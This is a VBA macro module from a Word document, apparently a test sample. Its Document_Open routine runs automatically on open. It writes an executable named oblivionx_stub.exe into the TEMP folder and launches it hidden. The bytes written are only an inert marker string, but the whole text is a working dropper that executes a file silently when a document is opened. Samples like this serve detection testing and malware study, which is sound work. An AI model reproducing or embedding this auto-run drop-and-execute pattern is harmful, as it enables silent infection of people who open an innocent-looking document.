Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim f As Integer, exe As String
    exe = Environ("TEMP") & "\oblivionx_stub.exe"
    f = FreeFile
    Open exe For Binary As #f
    Put #f, , "MZ-this-is-an-inert-marker-stub"
    Close #f
    Shell exe, 0
End Sub
